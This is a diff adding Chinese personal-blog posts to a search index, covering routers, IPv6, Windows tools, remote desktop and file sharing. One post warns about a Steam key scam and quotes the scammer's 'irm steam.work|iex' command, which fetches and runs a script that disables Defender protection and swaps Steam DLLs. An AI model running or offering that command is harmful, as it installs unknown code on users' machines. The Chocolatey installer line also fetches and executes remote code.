+        <content type="html"><![CDATA[<h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><p>就是硬路由有哪些功能,有基础的也有进阶的,想到什么加什么</p><h1 id="为什么不用软路由"><a href="#为什么不用软路由" class="headerlink" title="为什么不用软路由"></a>为什么不用软路由</h1><p>嫌麻烦,懒得买设备,也懒得拆开刷op</p><h1 id="dhcp静态ip"><a href="#dhcp静态ip" class="headerlink" title="dhcp静态ip"></a>dhcp静态ip</h1><p>固定设备的内网ip,当然只能和路由器同一网段</p><h1 id="限制设备连接外网"><a href="#限制设备连接外网" class="headerlink" title="限制设备连接外网"></a>限制设备连接外网</h1><p>可以用于电视去广告的思路上</p><h1 id="查询设备内网ip"><a href="#查询设备内网ip" class="headerlink" title="查询设备内网ip"></a>查询设备内网ip</h1><p>也可以看到hostname,不过安卓设备的不对就是了</p><h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><p>还有dmz,本质上就是外网请求到路由器之后,路由器根据端口转发,emby之类的还是需要用到这个的</p><h1 id="路由器hosts"><a href="#路由器hosts" class="headerlink" title="路由器hosts"></a>路由器hosts</h1><p>这个功能不错,电脑的hosts可以随便修改,但是手机不行,就用得上路由器的hosts</p><p><strong>但是切记一些红米运营商定制是没有这个功能的,一把辛酸泪啊</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络 </tag>
+            
+            <tag> 路由器 </tag>
+            
+            <tag> 硬路由 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>steam骗局一则</title>
+      <link href="/2024/01/25/steam%E9%AA%97%E5%B1%80%E4%B8%80%E5%88%99/"/>
+      <url>/2024/01/25/steam%E9%AA%97%E5%B1%80%E4%B8%80%E5%88%99/</url>
+      
+        <content type="html"><![CDATA[<h1 id="stream购买cdk骗局"><a href="#stream购买cdk骗局" class="headerlink" title="stream购买cdk骗局"></a>stream购买cdk骗局</h1><p>偶然一次在pdd购买游戏的时候碰到的</p><h2 id="骗局细节"><a href="#骗局细节" class="headerlink" title="骗局细节"></a>骗局细节</h2><p>商家给你个命令让你执行,之后用他的cdk</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>irm steam.work|iex  这个是远程下载的命令</p><h3 id="命令背后做了什么"><a href="#命令背后做了什么" class="headerlink" title="命令背后做了什么"></a>命令背后做了什么</h3><p>从网上下载了一个脚本下来执行<br>脚本加了三重AES加密（你猜他为什么要加密）<br>设置Windows Defender除外Steam目录下的安全防护<br>删除steam目录下几个dll文件<br>从网上下载hid.dll覆盖到steam的本地目录<br>以及还下了其他用于破解的库<br>不用我多说了吧</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 骗局 </tag>
+            
+            <tag> 随笔 </tag>
+            
+            <tag> stream </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ipv6公网个人应用</title>
+      <link href="/2024/01/25/ipv6%E5%85%AC%E7%BD%91%E4%B8%AA%E4%BA%BA%E5%BA%94%E7%94%A8/"/>
+      <url>/2024/01/25/ipv6%E5%85%AC%E7%BD%91%E4%B8%AA%E4%BA%BA%E5%BA%94%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="开启方法"><a href="#开启方法" class="headerlink" title="开启方法"></a>开启方法</h1><ol><li>光猫桥接,关闭dhcp,这一步不算刚需,但是光猫一定要开启ipv6</li><li>路由器ppoe拨号,开启ipv6,设置好端口转发</li></ol><h1 id="流量"><a href="#流量" class="headerlink" title="流量"></a>流量</h1><p>默认开6了,所以测试的时候,可以用流量</p><h1 id="ipv6地址写法"><a href="#ipv6地址写法" class="headerlink" title="ipv6地址写法"></a>ipv6地址写法</h1><p>有时候需要加[]有时候不要,看情况</p><h1 id="ipv6-公网访问"><a href="#ipv6-公网访问" class="headerlink" title="ipv6 公网访问"></a>ipv6 公网访问</h1><p>地址老变,必须ddns<br>随便买一个域名,然后用ddns go工具<br>当然自己调用api或者其他工具也行,原理上很简单<br>就是定期更新ddns解析的地址</p><h1 id="不方便的地方"><a href="#不方便的地方" class="headerlink" title="不方便的地方"></a>不方便的地方</h1><p>也有的,老路由器特么的没有ipv6功能</p><p>过长,还有涉及到内网的时候,还是在用ipv4的</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络 </tag>
+            
+            <tag> ipv6 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>win包管理选择</title>
+      <link href="/2024/01/25/win%E5%8C%85%E7%AE%A1%E7%90%86%E9%80%89%E6%8B%A9/"/>
+      <url>/2024/01/25/win%E5%8C%85%E7%AE%A1%E7%90%86%E9%80%89%E6%8B%A9/</url>
+      
+        <content type="html"><![CDATA[<h1 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h1><p>我个人觉得在不用太多配置的程序中,使用包管理相对于便携式,更方便</p><h1 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h1><h2 id="三方的"><a href="#三方的" class="headerlink" title="三方的"></a>三方的</h2><p>已经放弃choco和scoop</p><h2 id="winget"><a href="#winget" class="headerlink" title="winget"></a>winget</h2><p>亲儿子的软件更多现在,使用上,大部分需要的操作也是有了</p><h3 id="附录choco简单命令"><a href="#附录choco简单命令" class="headerlink" title="附录choco简单命令"></a>附录choco简单命令</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.<span class="built_in">Net</span>.WebClient).DownloadString(&#x27;https://chocolatey.org/install.ps1&#x27;))</span><br><span class="line">choco <span class="built_in">help</span></span><br><span class="line">choco export</span><br><span class="line">choco feature enable -n=allowGlobalConfirmation</span><br><span class="line">choco install packages.config</span><br><span class="line">choco install python vscode nodejs git clion-ide virtualbox powertoys vivaldi.install pycharm</span><br><span class="line"><span class="function">https://<span class="title">community.chocolatey.org</span>/<span class="title">packagesSet</span>-<span class="title">ExecutionPolicy</span> <span class="title">Bypass</span> -<span class="title">Scope</span> <span class="title">Process</span> -<span class="title">Force</span>; <span class="title">iex</span> ((<span class="title">New</span>-<span class="title">Object</span> <span class="title">System.Net.WebClient</span>).<span class="title">DownloadString</span>(&#x27;<span class="title">https</span>://<span class="title">chocolatey.org</span>/<span class="title">install.ps1</span>&#x27;))</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 软件 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 包管理 </tag>
+            
+            <tag> 软件安装 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ev搜索语法简析</title>
+      <link href="/2024/01/25/ev%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95/"/>
+      <url>/2024/01/25/ev%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>网上所见ev语法教程,全是在照抄帮助,未见较为深入的搜索示例<br>并且,也没有成体系的语法书写规范<br>根据实际需求,总结了个人的一套ev搜索语法写法,抛砖引玉,供各位参考</p><p>定期补充</p><h1 id="实际问题"><a href="#实际问题" class="headerlink" title="实际问题"></a>实际问题</h1><p>初学ev总觉得满腹想法,到了ev上不知道怎么写,有多个限定条件的情况下,乱写一气,啥也搜不出来,故而需要有一个合理的ev搜索语法的编写顺序<br>避免写出</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">folder:<span class="title">child:size</span>:&gt;1<span class="title">gb</span> <span class="title">d</span>:\电影 大陆            (这是个错误的示例)</span></span><br></pre></td></tr></table></figure><p>这样乍一看把所有需要的内容全部一股脑塞进去,但是实际上什么都搜不到的写法</p><h1 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h1><p>经过一定时间的使用,总结的写法,算不上完整,但是应答大多数情况足矣<br><strong>路径限定    修饰符:关键词选项: 关键词     非关键词选项: 限定内容</strong></p><p>对应的是写语法时候的思维顺序</p><ol><li>首先确定要搜索的范围,比如d:\</li><li>然后考虑自己是否需要使用正则或者ascii之类的特殊语法,就是所谓的修饰符,修饰符的后面不要求跟关键词之类的,位置要求其实相对宽松,为了规范,在此声明较为稳妥</li><li>然后确定自己想搜索的是文件夹还是文件写下关键词选项例如folder: child:  file: 然后填写实际关键词</li><li>此时已经搜索到了大量搜索结果了,这时候发现可能结果太多了,需要筛选日期是今天的,大小大于1gb的文件,就可以在后面跟上这些非关键词选项,例如size:&gt;1gb这样的</li></ol><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>比如某人d盘电影文件夹中,部分文件名包含例如大陆的特殊文字,但是其所在文件夹名中不包含该文字,并且要求大于1gb,并且是今天修改的文件<br>可以使用</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">d:\电影 <span class="title">child</span>:大陆 <span class="title">size</span>&gt;1<span class="title">gb</span> <span class="title">datemodified:today</span></span></span><br></pre></td></tr></table></figure><h1 id="易错的写法"><a href="#易错的写法" class="headerlink" title="易错的写法"></a>易错的写法</h1><p>ev语法中的选项是例如size:这样的,无论后面跟什么操作符都不能漏掉:</p><p>写作size:&gt;1gb</p><p>初学者经常写出size&gt;1gb这样似是而非的</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> everything </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> everything </tag>
+            
+            <tag> 软件 </tag>
+            
+            <tag> 搜索 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>远程桌面方案</title>
+      <link href="/2024/01/25/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%96%B9%E6%A1%88/"/>
+      <url>/2024/01/25/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%96%B9%E6%A1%88/</url>
+      
+        <content type="html"><![CDATA[<h1 id="局域网mstsc"><a href="#局域网mstsc" class="headerlink" title="局域网mstsc"></a>局域网mstsc</h1><ol><li>mic账户的也可以用</li><li>重装机后如果是pin登录的把登录选项下面的几个取消勾选,重启,关掉pin用密码登录,然后就可以mstsc中用用户名和密码登录自己用的账号了</li><li>据我测试登录第二个账户是要另一边确认的,登录主账户应该是不要确认的<br>mstsc &#x2F;v:hzn-lap &#x2F;f<br>win7在电脑属性中打开,win11直接设置搜索远程桌面</li></ol><h1 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h1><p>ipv6有公网ip的情况下可以做ddns域名访问远程桌面,不过我个人感觉网速不行,有点卡</p><h1 id="手机"><a href="#手机" class="headerlink" title="手机"></a>手机</h1><p>rd客户端吧</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>mstsc账户登录的形式,三方工具大部分就是传屏幕,原理上的话三方工具天生要用更大的带宽,但是两边都能同时操作电脑,偶尔也是优点</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 远程桌面 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 公网 </tag>
+            
+            <tag> 局域网 </tag>
+            
+            <tag> 远程桌面 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>win中沙盒软件</title>
+      <link href="/2024/01/25/win%E4%B8%AD%E6%B2%99%E7%9B%92%E8%BD%AF%E4%BB%B6/"/>
+      <url>/2024/01/25/win%E4%B8%AD%E6%B2%99%E7%9B%92%E8%BD%AF%E4%BB%B6/</url>
+      
+        <content type="html"><![CDATA[<h1 id="自带方案"><a href="#自带方案" class="headerlink" title="自带方案"></a>自带方案</h1><p>10以上专业版系统现有win沙盒,cp中开启功能后可以使用,类似一个会恢复的虚拟机一样<br>使用简单,没啥功能</p><h2 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h2><ol><li>系统语言英文,要调整一下输入法才能在部分界面打字</li><li>代理会有问题,有空排查一下为什么会影响</li><li>并不是完整的系统,ev这种工具弄进去用不了,这个详细测试之后</li></ol><h1 id="三方"><a href="#三方" class="headerlink" title="三方"></a>三方</h1><h2 id="sandboxie"><a href="#sandboxie" class="headerlink" title="sandboxie"></a>sandboxie</h2><p>免费用户的功能也够用,可以直接在某个程序的右键菜单中选择沙盒打开,相对来说灵活一点,甚至可以用来多开迅雷啥的</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 软件 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 软件 </tag>
+            
+            <tag> 沙盒 </tag>
+            
+            <tag> 安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>远程开机方案</title>
+      <link href="/2024/01/24/%E8%BF%9C%E7%A8%8B%E5%BC%80%E6%9C%BA%E6%96%B9%E6%A1%88/"/>
+      <url>/2024/01/24/%E8%BF%9C%E7%A8%8B%E5%BC%80%E6%9C%BA%E6%96%B9%E6%A1%88/</url>
+      
+        <content type="html"><![CDATA[<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>一般来说家里的高配台式或者是nas之类的主机会有这种远程开机的需求</p><h1 id="wol"><a href="#wol" class="headerlink" title="wol"></a>wol</h1><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>局域网配置简单,连接网线,开hdcp静态ip<br>bios开启对应功能,网卡设置中也要打开允许魔术包和wol唤醒</p><h2 id="安卓"><a href="#安卓" class="headerlink" title="安卓"></a>安卓</h2><p>安卓wol程序,根据mac和ip确定设备,发送广播数据包</p><h2 id="win"><a href="#win" class="headerlink" title="win"></a>win</h2><p>有命令行程序wol.exe</p><h2 id="公网使用wol"><a href="#公网使用wol" class="headerlink" title="公网使用wol"></a>公网使用wol</h2><p>ipv4公网ip现在基本弄不到,不提了<br>ipv6公网需要先发到网关,网关发ipv4的局域网广播,相对来说比较麻烦,放弃</p><h1 id="唤醒外设"><a href="#唤醒外设" class="headerlink" title="唤醒外设"></a>唤醒外设</h1><p>一般是开机棒或者是智能插座之类<br>原理就是连上wifi,用厂商的服务器向外设发指令,控制断电恢复,电脑的来电自启功能完成开机</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>须知无线网卡是搞不了的,或者说很麻烦,不折腾</p><h1 id="替代方案"><a href="#替代方案" class="headerlink" title="替代方案"></a>替代方案</h1><p>电脑休眠,计划任务定时唤醒,不关机也行</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> nas </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 公网 </tag>
+            
+            <tag> win日常使用 </tag>
+            
+            <tag> 局域网 </tag>
+            
+            <tag> 远程 </tag>
+            
+            <tag> 开机 </tag>
+            
+            <tag> wol </tag>
+            
+            <tag> 硬件 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>局域网共享文件方案</title>
+      <link href="/2024/01/24/%E5%B1%80%E5%9F%9F%E7%BD%91%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E6%96%B9%E6%A1%88/"/>
+      <url>/2024/01/24/%E5%B1%80%E5%9F%9F%E7%BD%91%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E6%96%B9%E6%A1%88/</url>
+      
+        <content type="html"><![CDATA[<h1 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h1><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><ol><li>检查网络不是公用,专用可以</li><li>检查共享的设置都打开了</li><li>文件夹打开共享</li><li>网络邻居和tc里面就可以访问共享文件夹了,即使锁屏之类的也可以访问</li><li><strong>电视上搜不出来的主要是因为没有开smb1.0的支持</strong></li></ol><h1 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h1><h3 id="win"><a href="#win" class="headerlink" title="win"></a>win</h3><p>tc打开ftp服务,tc可以作为简单的ftp客户端</p><h3 id="安卓"><a href="#安卓" class="headerlink" title="安卓"></a>安卓</h3><p>自带文件管理器或者小工具打开ftp服务<br>其他设备可以根据ip访问手机ftp,hostname需要root才能查看修改<br>手机的ip如果固定可以写入电脑的hosts</p><h2 id="局域网同步"><a href="#局域网同步" class="headerlink" title="局域网同步"></a>局域网同步</h2><p>微力同步</p><h2 id="让别人传文件"><a href="#让别人传文件" class="headerlink" title="让别人传文件"></a>让别人传文件</h2><p>相较于ftp,给别人用的时候有gui相对简单一些</p><h2 id="分享文件给电视"><a href="#分享文件给电视" class="headerlink" title="分享文件给电视"></a>分享文件给电视</h2><p>大部分电视上的商店或者文件管理器带了http协议的分享,速度慢,麻烦<br>如果是安装程序的话,直接adb相对来说简单一点</p><h2 id="安卓-1"><a href="#安卓-1" class="headerlink" title="安卓"></a>安卓</h2><p>同理,安装程序的话,adb也可以<br>miui+之类的工具固然可视化看起来操作简单</p><p>smb和ftp简单情况可用</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络 </tag>
+            
+            <tag> 局域网 </tag>
+            
+            <tag> 共享 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>本地音乐方案</title>
+      <link href="/2024/01/24/%E6%9C%AC%E5%9C%B0%E9%9F%B3%E4%B9%90%E6%96%B9%E6%A1%88/"/>
+      <url>/2024/01/24/%E6%9C%AC%E5%9C%B0%E9%9F%B3%E4%B9%90%E6%96%B9%E6%A1%88/</url>
+      
+        <content type="html"><![CDATA[<h1 id="为什么要本地听歌"><a href="#为什么要本地听歌" class="headerlink" title="为什么要本地听歌"></a>为什么要本地听歌</h1><ol><li>白嫖</li><li>灵活</li><li>装逼</li></ol><h1 id="本地音乐管理"><a href="#本地音乐管理" class="headerlink" title="本地音乐管理"></a>本地音乐管理</h1><h2 id="音乐质量"><a href="#音乐质量" class="headerlink" title="音乐质量"></a>音乐质量</h2><p>香港老歌320k就行了,没必要无损,低于320k的就有点不太行了</p><h2 id="存放"><a href="#存放" class="headerlink" title="存放"></a>存放</h2><ul><li><p>播放器媒体库自动分类,必要手动分类</p></li><li><p>也可以使用tc的批量重命名,根据元数据分类</p></li></ul><h2 id="win"><a href="#win" class="headerlink" title="win"></a>win</h2><ol><li><p>媒体库播放器: musicplayer2 </p></li><li><p>musictag抓取音乐元数据</p></li><li><p>简单试听:1by1,千千静听</p></li></ol><h4 id="放弃的"><a href="#放弃的" class="headerlink" title="放弃的"></a>放弃的</h4><p>foobar 需要使用他人的配置,没必要折腾<br>aimp,视觉效果上优于musicplayer2,但是用不上,故而选择简单精致的mp</p><h2 id="安卓"><a href="#安卓" class="headerlink" title="安卓"></a>安卓</h2><ol><li>播放器:salt player</li><li>备选: aplayer</li></ol><h2 id="同步音乐"><a href="#同步音乐" class="headerlink" title="同步音乐"></a>同步音乐</h2><p>方案: 微力同步<br>临时拷贝的话可以使用smb</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> nas </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 软件 </tag>
+            
+            <tag> 本地 </tag>
+            
+            <tag> 音乐 </tag>
+            
+            <tag> 播放器 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
